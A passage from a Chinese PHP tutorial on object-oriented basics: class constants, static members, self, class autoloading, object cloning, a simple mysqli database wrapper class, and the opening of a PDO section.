错误，$s1-&gt;PI最终转换的访问方式为:$PI，这个在类中并不存在</code></pre><p>2、以上案例可以看出，对象无法访问类常量，那是因为类常量的定义本身就是用来给类访问的，对象是用来访问属性和方法的，类常量的访问方式为：类名::常量名</p><pre><code># 类+范围解析操作符访问类常量echo Saler::PI;            # 输出3.14</code></pre><p>3、对象本身也依赖于类，因此也可以使用对象对类控制成员进行访问，需要使用范围解析操作符</p><pre><code>$s = new Saler();echo $s::PI;            # 输出3.14</code></pre><p><strong>注意</strong>：以上方式能访问，但是不建议使用（以上方式也能看出，成员谁来访问，关键看用什么符号：①使用范围解析操作符<code>::</code>就是类访问；②使用对象操作符号<code>-&gt;</code>就是对象访问）</p><p>4、分析：类常量是固定的，而对象的属性是不同对象而不同的，成员方法简单的理解也是为属性本身进行加工的。因此有一些东西是专属于类的，而有部分内容是专门为对象提供的，所以就会有不同的成员拥有不同的访问方式</p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类访问成员的方式是使用范围解析操作符“<strong>::</strong>”访问，由类名直接访问：类名::类常量</p><p>2、类本身是通过对同类对象的抽象而形成，所以属性和方法本身都是由对象来访问</p><p>3、类也需要有一些自身的数据和操作，这些就由类来进行访问</p><h3 id="11、静态成员"><a href="#11、静态成员" class="headerlink" title="11、静态成员"></a><strong>11、静态成员</strong></h3><blockquote><p>目标：理解静态成员的概念，掌握静态成员的性质以及访问方式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>静态成员</strong>：使用static关键字修饰的类成员，表示该成员属于类访问</p><ul><li>PHP静态成员有两种<ul><li>静态属性</li><li>静态方法</li></ul></li><li>静态成员是明确用来给类访问的，而不是对象</li><li>静态成员只是多了一个static关键字修饰，本身也可以被对象访问</li><li>静态成员同样可以使用不同访问修饰限定符限定，效果一致</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定有些成员（属性、方法）不需要对象访问，直接通过类访问</p><p>3、使用static关键字修饰</p><p>4、静态成员应该让类进行访问</p><blockquote><p>示例</p></blockquote><p>1、静态属性：在类中定义属性的时候使用static关键字修饰，访问的时候只能使用类+范围解析操作符+静态属性访问</p><pre><code>class Saler{    # 属性    public $money = 0;    public static $count = 0;    # 静态属性}# 静态成员可以直接使用类访问，而不需要先实例化对象echo Saler::$count;</code></pre><p>2、静态方法：在类中定义方法的时候使用static关键字修饰，访问的时候使用类+范围解析操作符+静态方法名字()访问</p><pre><code>class Saler{    # 方法    public static function showClass(){        echo __CLASS__;    }}# 类直接访问Saler::showClass();</code></pre><p>3、在类的内部也可以访问静态成员，同样是使用类名+范围解析操作符+静态属性/静态方法()</p><pre><code>class Saler{    # 属性    private static $count = 0;            # 私有，不允许外部直接访问    # 方法    public static function showClass(){        echo Saler::$count;    }}# 类直接访问Saler::showClass();</code></pre><p>4、静态方法本质也是类中定义的方法，因此也可以使用对象进行访问，但是<strong>不建议</strong></p><pre><code># 对象访问静态方法$s = new Saler();$s-&gt;showClass();                        # 输出0</code></pre><p>5、同理，方法也是在类内部，在编译时就存在，因此可以通过类来进行访问，使用范围解析操作符，但是<strong>非常不建议</strong>（会报错：因为类只允许访问静态成员和类常量）</p><pre><code>class Saler{    public function testStatic(){        echo __FUNCTION__;    }}# 类访问普通成员方法Saler::testStatic();                # 输出testStatic，但是报错，当前访问的不是静态方法</code></pre><p>6、静态方法本质是给类访问，所以不允许在静态方法内部使用$this对象</p><pre><code>class Saler{    public static function testStaticThis(){        var_dump($this);                # 致命错误：$this放到了不该放的位置    }}            </code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、为了保障类能直接访问数据和操作数据，可以在属性和方法前增加static关键字变成静态属性和静态方法</p><p>2、类通过类名+范围解析操作符+静态成员的方式进行访问</p><p>3、静态成员也受访问修饰限定符的限定，访问权限与普通属性和方法的限制一样</p><p>4、对象可以无条件访问静态方法，而类只能访问不带$this的普通方法（不建议）</p><p>5、静态成员是给类访问的，非静态成员是给对象访问的</p><ul><li>静态属性和方法（静态和非静态）都是保存在类结构中（代码段）</li><li>普通属性保存在对象生成的对象空间里（堆）</li></ul><p>6、静态成员的访问效率比非静态成员高，因此有种说法是能用静态的时候就不用非静态（对象的特点是多元化，而静态的特点是单一化）</p><h3 id="12、self关键字"><a href="#12、self关键字" class="headerlink" title="12、self关键字"></a><strong>12、self关键字</strong></h3><blockquote><p>目标：了解self关键字的作用和应用场景</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>self关键字</strong>：在<strong>类的内部</strong>（方法里面）使用，代替类名的写法</p><ul><li><p>self如同$this代表内部对象一样，能够在方法内部代替当前类名</p></li><li><p>能够保障用户方便修改类名字</p></li><li><p>self关键字是代替类名，所以需要配合范围解析操作符<code>::</code></p></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、方法内部需要使用类名来进行成员访问（类常量、静态成员）</p><p>3、使用self关键字代替类名</p><blockquote><p>示例</p></blockquote><p>1、self是用来代替类名的，与范围解析操作符<code>::</code>一起使用的</p><pre><code>class Saler{    # 静态属性    private static $count = 0;            # 私有，不允许外部直接访问    # 静态方法    public static function showClass(){        echo Saler::$count;        echo self::$count;                # 代替类名    }}</code></pre><p>2、self也可以在类的内部方便实例化对象：比如构造方法被私有化之后，就没有办法在类外部实例化对象，此时可以在类内部进行对象实例化</p><pre><code>class Saler{    # 属性    private static $count = 0;            # 私有，不允许外部直接访问    private function __construct(){}    # 私有，不允许外部实例化（因为对象不能外部调用）    # 方法    public static function getInstance(){        return new Saler();                # 使用类名实例化        return new self();                # 使用self关键字实例化    }}$s = Saler::getInstance();</code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、self是一种在类内部用来代替类名的关键字</p><p>2、self可以用来在类内部访问静态成员</p><p>3、self也可以在类内部用来实例化对象</p><p>4、帮助类名修改时，不用修改任何类的内部结构</p><h3 id="13、类的加载"><a href="#13、类的加载" class="headerlink" title="13、类的加载"></a><strong>13、类的加载</strong></h3><blockquote><p>目标：理解类的使用机制，掌握类的加载方式和原理</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>类的加载</strong>：类的访问必须保证类在内存中已经存在，所以需要在用类之前将类所在的PHP文件加载到内存</p><ul><li><p>类的加载分为两种</p><ul><li>手动加载：在需要使用类之间通过include将包含类的文件引入到内存</li><li>自动加载：提前定义好类结构和位置，<strong>写好引入类文件代码</strong>，在系统需要类而内存不存在的时候想办法让写好的加载类的代码执行（自动加载是自动运行写好的加载类的代码）</li></ul></li><li><p>真实开发中因为类文件很多，所以通常都会使用自动加载来节省开发工作量</p></li><li><p>自动加载有两种方式都可以实现</p><ul><li><p>魔术函数__autoload()：系统自动调用，需要传入类名，在函数内部实现类的手动加载</p><p>function __autoload($classname){</p><pre><code># 找到对应的文件路径和命名规范，手动加载</code></pre><p>}</p></li><li><p>自定义函数：自己定义类的加载实现，然后通过spl_autoload_register注册到自动加载机制（可以注册多个自动加载）</p><h1 id="自定义类加载函数"><a href="#自定义类加载函数" class="headerlink" title="自定义类加载函数"></a>自定义类加载函数</h1><p>function 自定义函数($classname){</p><pre><code># 找到对应的文件路径和命名规范，手动加载</code></pre><p>}</p><h1 id="注册自动加载"><a href="#注册自动加载" class="headerlink" title="注册自动加载"></a>注册自动加载</h1><p>spl_autoload_register(‘自定义函数名字’);</p></li></ul></li></ul><ul><li><p>自动加载要求在声明类的时候有良好的规范</p><ul><li>类名与文件名一致：类名.php（现在较多使用）或者类名.class.php</li><li>类文件分类放好</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类文件</p><ul><li>类文件是独立文件，除了类之外不包含其他代码</li><li>类文件通常是一个类一个文件</li></ul><p>2、确定加载类型，写好加载代码</p><ul><li><p>手动加载：主动在调用前手动加载即可</p></li><li><p>自动加载__autoload()：实现好自动加载函数，在使用类之前声明好</p></li><li><p>自动加载spl_autoload_register()：自定义加载函数，在使用类之前通过spl注册</p></li></ul><p>3、在明确类能够通过自己写的加载代码加载时，可以直接使用类</p><ul><li>能找到：实现类的加载和使用</li><li>找不到：报错类无法找到</li></ul><blockquote><p>示例</p></blockquote><p>1、手动加载：即要访问某个类之前，使用文件包含将类所在的文件加载进来</p><pre><code># 类文件：Saler.php&lt;?phpclass Saler{}?&gt;应用文件：useSaler.php# 使用Saler类需要先包含Saler类所在的文件include_once &apos;Saler.php&apos;;                # 通常使用include_once，因为类不允许重名$s = new Saler();</code></pre><p>2、加载类文件是一种比较消耗资源的方式，所以有的时候不确定类是否在内存中存在，可以事先使用class_exists()函数来判定是否存在，存在就不用加载，不存在才加载</p><pre><code># 使用Saler类，但是不确定内存中是否存在if(!class_exists(&apos;Saler&apos;)){    # 不存在：加载    include_once &apos;Saler.php&apos;;}# 使用$s = new Saler();</code></pre><p>3、自动加载：PHP没有那么智能的系统自动加载，所谓自动加载只是PHP提供了一种<code>加载机制</code>：即实现定义一个函数__autoload()，然后当系统需要使用类，而内存中又不存在的时候，系统就会自动调用__autoload()函数来加载类文件.</p><pre><code># 自动加载机制：利用系统提供的__autoload()函数function __autoload($classname){            # 参数为类名：即当前需要访问的类的名字    # 需要人为定义去哪加载，怎么加载       include_once $classname . &apos;.php&apos;;        # 假定为当前目录下，类文件名字为：类名.php}# 使用类：内存目前并没有$s = new Saler();                            # 系统发现内存没有Saler，所以调用__autoload()去加载</code></pre><p>4、一个系统里，可能类文件会放到不同的路径下，因此一个完整的自动加载函数，应该要进行文件判定以及加载功能</p><pre><code># 定义自动加载function __autoload($classname){    # 组织文件路径：假设当前路径下，有两个文件夹下都有类c和m    $c_file = &apos;c/&apos; . $classname . &apos;.php&apos;;        # 如c/Saler.php    if(file_exists($c_file)){        include_once $c_file;        return true;    }    # 说明c文件夹没有对应的文件    $m_file = &apos;m/&apos; . $classname . &apos;.php&apos;;        # 如m/Saler.php    if(file_exists($m_file)){        include_once $m_file;        return true;    }}</code></pre><p><strong>注意</strong>：自动加载是指按照开发者规定的路径去寻找对应的文件，并实现包含。如果文件不存在，那么系统会在使用类的时候报错，因为这是开发者自己犯的错，系统不能规避。</p><p>5、随着PHP版本的提升，在7以后，不怎么建议直接使用__autoload()函数，而是采用一种注册机制，将用户自定义的函数，放到系统内部，使用spl_autoload_register(定义好的函数)。本质与__autoload()一样</p><pre><code># 定义一个函数，用来加载类文件function my_autoload($classname){        # 也需要一个参数来接收要加载的类名字    # 功能与__autoload()一样    $c_file = &apos;c/&apos; . $classname . &apos;.php&apos;;        # 如c/Saler.php    if(file_exists($c_file)){        include_once $c_file;        return true;    }    # 说明c文件夹没有对应的文件    $m_file = &apos;m/&apos; . $classname . &apos;.php&apos;;        # 如m/Saler.php    if(file_exists($m_file)){        include_once $m_file;        return true;    }}# 此时，上述函数永远不会自动运行，除非将函数注册到系统内部spl_autoload_register(&apos;my_autoload&apos;);</code></pre><p><strong>注意</strong>：该方式其实本质就是通过两步完成了__autoload()一步的操作，但是spl_autoload_register()函数可以注册多个自定义的加载函数，更方便管理。</p><pre><code># c路径加载function c_autoload($classname){            $c_file = &apos;c/&apos; . $classname . &apos;.php&apos;;            if(file_exists($c_file)){        include_once $c_file;    }}# m路径加载function m_autoload($classname){            $m_file = &apos;m/&apos; . $classname . &apos;.php&apos;;            if(file_exists($m_file)){        include_once $m_file;    }}# 全部注册spl_autoload_register(&apos;c_autoload&apos;);spl_autoload_register(&apos;m_autoload&apos;);    </code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、类的使用必须先保证内存中该类存在</p><p>2、可以使用手动加载来确保类的使用安全：优点是明确，缺点是繁琐</p><p>3、可以使用自动加载来让系统按照开发者设定的路径和方式去寻找类，并尝试加载到内存</p><p>4、自动加载可以使用__autoload()函数来实现，也可以使用自定义函数+spl_autoload_register()注册共同实现（后者推荐）</p><ul><li>优点：代码简介（基本上属于一次性定义）</li><li>缺点：给人感觉不可控</li></ul><p>5、基本上所有的框架都在使用自动加载机制</p><h3 id="14、对象克隆"><a href="#14、对象克隆" class="headerlink" title="14、对象克隆"></a><strong>14、对象克隆</strong></h3><blockquote><p>目标：了解对象克隆的概念，掌握克隆魔术方法的意义</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>克隆对象</strong>：clone，即通过已有的对象复制一个新的同样的对象，但是两者之间并非同一个对象</p><ul><li>克隆对象与原来对象内容一致（表象）</li><li>克隆出来的对象是新对象</li><li>对象克隆出来后会自动调用魔术方法__clone()（如果有该方法）</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类时考虑对象是否允许被克隆，以及允许克隆后是否需要针对克隆对象做操作</p><ul><li>不允许克隆：私有化__clone()魔术方法（不允许外部克隆，使用者一般都是外部）</li><li>允许克隆处理：在__clone()方法中设定好克隆对象的处理</li></ul><p>2、实例化对象并保存到变量</p><p>3、需要从已有对象产生新对象（不是赋值）</p><p>4、使用clone产生对象</p><blockquote><p>示例</p></blockquote><p>1、对象克隆是通过clone关键字实现，即：clone 对象;</p><pre><code>class Saler{      # 属性      public $count;                      private $money;}# 实例化$s1 = new Saler();$s1-&gt;count = 1;# 克隆$s2 = clone $s1;</code></pre><p>2、克隆出来的对象与原来对象是两个内存地址，因此是两个不同的对象</p><pre><code># 接上述代码$s2-&gt;count = 2;echo $s1-&gt;count;        # 1，没有变化</code></pre><p>3、对象在实例化的时候会自动调用存在的构造方法__construct()，同样的，在类的内部，PHP允许定义一个__clone()的方法，在对象被克隆后，新克隆出来的对象会自动调用</p><pre><code>class Saler{      # 属性      public $count;                      private $money;    # 克隆方法    public function __clone(){        var_dump($this);            # 编号为2，代表是克隆出来的对象        $this-&gt;count++;    }}# 实例化$s1 = new Saler();$s1-&gt;count = 1;# 克隆$s2 = clone $s1;</code></pre><p>4、如果不允许对象被克隆，可以将__clone()方法私有化（本质是不允许对象在外部被克隆）</p><pre><code>class Saler{      # 属性      public $count;                      private $money;    # 私有化克隆方法    private function __clone(){}}# 实例化$s1 = new Saler();$s1-&gt;count = 1;# 克隆$s2 = clone $s1;            # 致命错误：不允许对象在外部访问一个私有方法</code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、对象可以通过克隆来得到新的对象（以前只有实例化）</p><p>2、克隆出来的对象会自动调用类中对应的__clone()方法（如果有）</p><p>3、因为克隆对象是新对象，不会改变原来的对象，如果需要一个和当前对象一致状态的对象，但是又不想改变当前对象的状态，那么就可以通过克隆来实现</p><p>4、可以通过私有化克隆方法来实现禁止外部对象克隆</p><h3 id="15、总结"><a href="#15、总结" class="headerlink" title="15、总结"></a>15、总结</h3><p>1、面向对象编程核心是“万物皆对象”的思想，与面向过程编程思想的本质区别是事务操作的主体：每一次操作都是由明确的对象来执行</p><p>2、面向对象思想的本质是将数据（属性）、数据操作（函数）进行的一次二次封装（类），而往后的所有操作都必须由类或者类产生的对象进行调用</p><p>3、面向对象核心关键字</p><ul><li><p>类：class，结构主体，某一类相似主体的公共部分抽离</p></li><li><p>类成员：类结构中能够直接定义的成员</p><ul><li>属性（property）：存储数据的变量</li><li>方法（method）：数据操作的逻辑</li><li>类常量（const）：存储固定数据的内部常量（const定义）</li></ul></li><li><p>实例化：new，类结构产生对象的过程</p></li><li><p>实例：instance，一个具体的对象</p></li></ul><p>4、访问修饰限定符：限定被修饰成员的方位位置（所有类成员都能被访问）</p><ul><li>public：公有，表示不限定访问区域</li><li>protected：受保护，表示限定范围为关联类内部（本质是方法内部，关联类需要学习继承）</li><li>private：私有，表示限定范围为自己类内部（内部方法内）</li></ul><p>5、类内部对象：$this</p><ul><li>普通方法内部，代表来访对象</li><li>因为在类内部，所以不论任何访问修饰限定符限定，都可以访问</li></ul><p>6、魔术方法：自动调用的方法</p><ul><li>构造方法：__construct()，对象初始化资源，对象实例化后自动调用</li><li>析构方法：__destruct()，对象销毁资源，销毁时对象自动调用</li><li>克隆方法：__clone()，对象被克隆后，克隆对象自动调用</li></ul><p>7、对象传值：对象是引用传值，不会产生新对象</p><p>8、范围解析操作符：<code>::</code>，用于类直接访问成员的符号</p><ul><li>类访问类专属成员：类常量（静态属性和静态方法）</li><li>对象也可以使用该符号访问类成员（不建议）</li></ul><p>9、静态成员：使用static关键字修饰的成员，用来给类访问的成员（对象也能访问）</p><ul><li>静态成员：静态属性和静态方法</li><li>静态成员在编译（类加载到内存）时初始化，不用产生对象即可访问（效率高）</li><li>静态属性不会出现在对象的内存空间</li></ul><p>10、self关键字：类内部用来代表类名访问类成员的</p><ul><li>self与范围解析操作符结合访问：self::类成员</li><li>self可以代替类名在类内部进行实例化：new self()</li></ul><p>11、类的加载：类的使用的前提是类在内存中必须存在</p><ul><li>手动加载：使用前写好加载路径</li><li>自动加载：在内存找不到要用的类的时候自动执行<ul><li>__autoload()函数：魔术函数，在函数内部写好加载方式</li><li>自定义函数+spl_autoload_register()函数：与魔术函数类似（建议使用）</li></ul></li></ul><p>12、对象克隆：从已有对象产生新对象</p><ul><li>防止克隆：私有化话克隆魔术方法</li></ul><p>13、多关注业务，懂得如何根据业务划分类，然后慢慢掌握类内部应该如何定义成员去解决需求问题，从而实现面向对象思想基本语法的使用</p><h3 id="16、封装数据库操作类"><a href="#16、封装数据库操作类" class="headerlink" title="16、封装数据库操作类"></a><strong>16、封装数据库操作类</strong></h3><blockquote><p>目标：理解类的封装的概念，掌握类的封装过程，掌握类成员的实际应用以及类对成员的控制关系</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>封装数据库操作类</strong>：因为目前所使用的mysqli扩展实现数据库的操作还比较零散，如果想要高效的使用，就必须要进行二次加工</p><ul><li>在面向对象编程中，所有操作都应该是由类来实现完成</li><li>封装的完整程度是根据业务的需求来定</li></ul><blockquote><p>步骤</p></blockquote><p>1、确定要封装的业务：基于mysqli的数据库底层实现，完成数据库操作的基本诉求</p><ul><li>简化初始化操作</li><li>实现错误处理</li><li>实现增删改查</li></ul><p>2、明确封装的类的作用，确定内部实现机制</p><ul><li>方法独立性：一个方法只做一件事情</li><li>方法独立性：方法只负责执行，不对结果进行任何处理，交由外部调用处判定</li><li>灵活性：封装的所有操作应该是灵活的，不是写死的内容</li></ul><p>3、根据思路明确封装类的数据和数据操作</p><ul><li>数据使用属性保留：数据需要跨方法或者对外提供数据支持<ul><li>数据库操作的数据：主机地址、端口、用户名、密码、数据库名字、字符集</li><li>数据库连接资源跨方法：连接资源</li><li>错误信息对外数据支持：错误信息、错误编号</li></ul></li><li>数据操作具体功能<ul><li>初始化资源工作：构造方法，实现属性初始化</li><li>初始化数据库资源：实现数据库的连接认证、字符集设置和数据库选择：失败返回false并记录错误</li><li>SQL指令语法检查：SQL执行并完成错误处理：失败返回false并记录错误</li><li>写操作：实现增伤改指令的执行：调用SQL指令语法检查，成功返回受影响行数</li><li>自增长ID获取：实现自增长id获取</li><li>读操作：单记录获取和多记录获取：调用SQL指令语法检查</li></ul></li></ul><p>4、确定类的控制</p><ul><li>不需要外部访问和使用的私有</li><li>明确外部需要用到的公有</li><li>如果数据安全性要求高，那么可以属性私有，但是允许对外提供可以操作的公有方法（内部安全处理）</li></ul><blockquote><p>示例</p></blockquote><p>1、一个类通常就是一个文件，所以要先确定文件的名字：通常类文件命名规范有两种</p><ul><li>文件名字与类名字一样，如Sql.php</li><li>为了区分普通PHP文件，增加中间类描述，如Sql.class.php</li><li>现在PHP几乎都是面向对象编程，所以通常采用第一种方式：因此当前命名数据类的文件为：Sql.php</li></ul><p>2、确定类文件名字后其实也就确定了类名字，因此可以创建一个Sql类</p><pre><code># 数据库操作类class Sql{}</code></pre><p>3、类的创建分两种：一是特定使用，即类里面的所有内容只为某次使用；二是通用，即工具类，以后很多地方可以用。</p><ul><li>特定使用，功能可以不用太灵活</li><li>通用工具，功能应该大众化，数据的变化会比较多</li></ul><p><strong>数据库类</strong>以后凡是要操作数据库的地方都可以用得到，很多项目都会用到，所以应该是个通用工具类，因此要考虑其到处可用的特性，让其能够灵活</p><p>4、数据库的操作最基本的特性不会改变：即需要连接认证，而连接认证的信息是灵活的，所以可以通过设定属性来控制，这些信息也都是不同使用者不同的，应该可以改变，所以可以通过构造方法来实现数据传入</p><pre><code># 数据库操作类class Sql{    # 设置属性：数据库初始化信息    public $host;    public $port;    public $user;    public $pass;    public $dbname;    public $charset;    # 构造方法初始化数据：数据较多，应该使用数组来传递数据，关联数组，而且绝大部分的开发者本意是用来测试，所以基本都是本地，因此可以给默认数据    /*        $info = array(            &apos;host&apos; =&gt; &apos;localhost&apos;,            &apos;port&apos; =&gt; &apos;3306&apos;,            &apos;user&apos; =&gt; &apos;root&apos;,            &apos;pass&apos; =&gt; &apos;root&apos;,            &apos;dbname&apos; =&gt; &apos;blog&apos;,            &apos;charset&apos; =&gt; &apos;utf8&apos;        )    */    public function __construct(array $info = array()){        # 初始化：确保用户传入了数据，否则使用默认值        $this-&gt;host = $info[&apos;host&apos;] ?? &apos;localhost&apos;;        $this-&gt;port = $info[&apos;port&apos;] ?? &apos;3306&apos;;        $this-&gt;user = $info[&apos;user&apos;] ?? &apos;root&apos;;        $this-&gt;pass = $info[&apos;pass&apos;] ?? &apos;root&apos;;        $this-&gt;dbname = $info[&apos;dbname&apos;] ?? &apos;test&apos;;        $this-&gt;charset = $info[&apos;charset&apos;] ?? &apos;utf8&apos;;    }}</code></pre><p><strong>注意</strong>：方法设定的原则是一个方法只实现一个简单的功能，不要多个功能堆积到一个方法中。</p><p>5、数据库属性会在实例化Sql对象的时候自动初始化</p><pre><code># 接上述代码（类外测试）$s1 = new Sql();            # 使用默认数据库信息$db = array(    &apos;host&apos; =&gt; &apos;192.168.0.1&apos;,    &apos;user&apos; =&gt; &apos;admin&apos;,    &apos;pass&apos; =&gt; &apos;admin&apos;,    &apos;dbname&apos; =&gt; &apos;Taobao&apos;);$s2 = new Sql($db);            # 使用外部数据库信息</code></pre><p>6、数据库要操作的第一件事就是连接认证，所以需要一个连接认证的功能。这里可以使用mysqli面向过程的方法。但是需要建立一个方法来实现连接认证：连接是否成功？</p><pre><code># 对外提供属性，记录错误数据（外部如何处理，不需要我们管）public $errno;public $error;# mysqli的连接资源对象是任何mysqli扩展操作的基础，因此需要该连接对象能够在其他方法中使用：属性处理public $link;# 在上述类中增加一个方法：实现连接认证功能public function connect(){    # 利用属性可以跨方法访问：5个参数分别为：主机、用户名、密码、数据库、端口    # 利用错误抑制符抑制可能出现的错误    $this-&gt;link = @mysqli_connect($this-&gt;host,$this-&gt;user,$this-&gt;pass,$this-&gt;dbname,$this-&gt;port);    # 判定连接是否成功    if(!$this-&gt;link){        # 将错误信息保存到记录错误的属性中，返回false        $this-&gt;errno = mysqli_connect_errno();        $this-&gt;error = mysqli_connect_error();        return false;    }    # 返回一个连接结果：不需要返回资源对象，为真即可表示成功    return true;}</code></pre><p>7、连接认证包括数据库选择设定好后，此时还存在一个细节问题：字符集，为了保证数据库连接的正常操作，需要新增一个方法设定字符集</p><pre><code># 在Sql类中增加设定字符集的方法public function charset(){    # 调用mysqli的设置字符集的函数    $res = mysqli_set_charset($this-&gt;link,$this-&gt;charset);    # 判定是否成功    if(!$res){        $this-&gt;errno = mysqli_errno($this-&gt;link);        $this-&gt;error = mysqli_error($this-&gt;link);        return false;    }    return true;}</code></pre><p>8、初始化完成后，可以实现具体的业务处理：所有的SQL都需要使用mysqli_query执行，也都可能产生错误，因此封装一个专门执行SQL并检查错误的方法</p><pre><code># SQL执行以及错误检查public function check($sql){    # 执行SQL    $res = mysqli_query($this-&gt;link,$sql);    # 判定结果    if(!$res){        $this-&gt;errno = mysqli_errno($this-&gt;link);        $this-&gt;error = mysqli_error($this-&gt;link);        return false;    }    # 返回正确结果    return $res;}</code></pre><p>9、上述功能本质也可以是一个写操作（不完整），但是写操作是有业务性的：返回受影响的行数，因此独立增加一个写操作方法，调用上述方法实现，并根据结果返回受影响的行数</p><pre><code># 写操作public function write($sql){    # 调用方法检查执行    $res = $this-&gt;check($sql);    # 判定执行结果：成功返回受影响的行数，失败返回false，错误已经在check方法中记录    return $res ? mysqli_affected_rows($this-&gt;link) : false;}</code></pre><p>10、写操作中可能会有新增需求，因此也对外提供一个获取自增长Id的方法</p><pre><code># 自增长idpublic function insert_id(){    return mysql_insert_id($this-&gt;link);}</code></pre><p>11、读取操作：读取一条记录（利用check进行SQL执行和错误检查）：读取一条数据可能需要获取当前查询结果的列数，增加属性保留</p><pre><code># 属性：记录查询结果中的列数public $columns = 0;# 读操作public function read_one($sql){    # 执行SQL错误检查    $res = $this-&gt;check($sql);    # 读取记录列数    $this-&gt;columns = @mysqli_field_count($this-&gt;link);    # 判定结果，进行加工：成功读取一条记录，失败返回错误信息    return $res ? mysqli_fetch_assoc($res) : $res;}</code></pre><p>12、读取操作：读取多条记录：可能需要知道总的记录数以及查询结果的列数</p><pre><code># 属性：记录查询结果的行数public $rows = 0;# 读操作public function read_all($sql){    # 执行SQL错误检查    $res = $this-&gt;check($sql);    # 判定结果，进行加工    if(!$res) return $res;    # 记录结果数量    $this-&gt;rows = mysqli_num_rows($res);     # 根据需求解析数据    $list = [];    while($row = mysqli_fetch_assoc($res)) $list[] = $row;    # 返回结果    return $list;}</code></pre><p>13、用户在使用Sql类的时候，必须要进行第一步实例化、然后连接认证和实现字符集设置。这样的话用户操作比较麻烦，应该是用户实例化Sql类就可以直接进行相应的业务处理：所以可以将连接认证、字符集设置在初始化方法中实现（构造方法）</p><pre><code>public function __construct(array $info = array()){    # 初始化：确保用户传入了数据，否则使用默认值    $this-&gt;host = $info[&apos;host&apos;] ?? &apos;localhost&apos;;    $this-&gt;port = $info[&apos;port&apos;] ?? &apos;3306&apos;;    $this-&gt;user = $info[&apos;user&apos;] ?? &apos;root&apos;;    $this-&gt;pass = $info[&apos;pass&apos;] ?? &apos;root&apos;;    $this-&gt;dbname = $info[&apos;dbname&apos;] ?? &apos;test&apos;;    $this-&gt;charset = $info[&apos;charset&apos;] ?? &apos;utf8&apos;;    # 调用初始化和字符集设置    if(!$this-&gt;connect()) return;    $this-&gt;charset();}</code></pre><p>14、确定类的控制：不需要外部访问的私有，需要外部访问的公有，重要的数据私有并增加公有操作方法进行安全控制</p><pre><code># 数据库初始化资源私有：不需要外部访问private $host;private $port;private $user;private $pass;private $dbname;private $charset;# 连接资源仅限内部使用private $link;# 连接认证和字符集设置已经内部调用，不需要外部使用private function connect(){}private function charset(){}# SQL检查属于内部调用，不需要公有private function check($sql){}</code></pre><p>14、测试：利用数据库类实现数据库的写操作和读操作</p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类的封装是以功能驱动为前提，相关操作存放到一个类中</p><p>2、一个类通常是一个独立的文件，文件名与类名相同（方便后期维护和自动加载）</p><p>3、类中如果有数据需要管理，设定属性</p><p>4、类中如果有功能需要实现（数据加工），设定方法</p><p>5、一个功能通常使用一个方法实现，方法的颗粒度应该尽可能小（方便复用）</p><p>6、应该尽可能增加类对成员的控制：即能私有尽可能私有</p><p>7、类中需要实现的功能应该由具体的业务来实现支撑</p><ul><li>实用类：只考虑当前业务，不考虑全面性（代码少，应用范围小）</li><li>工具类：全面综合考虑，尽可能多的封装可能存在的业务（代码多，应用范围广）</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php面向对象:PDO</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9APDO/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9APDO/</url>
      
        <content type="html"><![CDATA[<h4 id="转载于：黑马程序员武汉中心"><a href="#转载于：黑马程序员武汉中心" class="headerlink" title="转载于：黑马程序员武汉中心"></a>转载于：<a href="https://space.bilibili.com/434398031?from=search&amp;seid=16258300813915690" target="_blank" rel="noopener">黑马程序员武汉中心</a></h4><h1 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h1><blockquote><p>学习目标：学习别人写好的类的使用，掌握PDO类对数据库的操作，并且能够基于PDO进行二次封装来实现更快捷的项目开发</p></blockquote><ul><li>PDO扩展</li><li>PDO操作</li><li>PDO异常</li><li>封装PDO</li></ul><blockquote><p>概念</p></blockquote><p>PDO：php Data Object，是一种<strong>纯面向对象</strong>的数据库操作扩展</p><ul><li>PDO在php5以后的版本增加，是目前通用的php操作数据库的扩展</li><li>PDO能够支持多种数据库操作，不限定数据库产品类型</li><li>PDO是一种纯面向对象的操作，有三个类<ul><li>PDO类：初始化和SQL执行</li><li>PDOStatement类：结果解析</li><li>PDOException类：异常处理</li></ul></li></ul><blockquote><p>小结</p></blockquote><p>1、PDO是当前php操作数据库的通用扩展，所有新的项目目前都会首选PDO来操作数据库</p><h2 id="一、-PDO扩展"><a href="#一、-PDO扩展" class="headerlink" title="一、 PDO扩展"></a><strong>一、 PDO扩展</strong></h2><blockquote><p>目标：掌握PDO扩展的加载</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>PDO扩展</strong>：PDO提供了一套帮助用户实现多数据库操作的统一接口，属于扩展加载</p><ul><li>通过使用PDO，开发人员不需要额外自定义数据库对应的操作类，从而简化开发过程</li></ul><blockquote><p>示例</p></blockquote><p>1、PDO在php5以前，是需要手动加载扩展的，在php.ini配置文件中，会有这么一个扩展（在php5以后就自动加载了不需要手动再加载）</p><pre><code>;extension = pdo                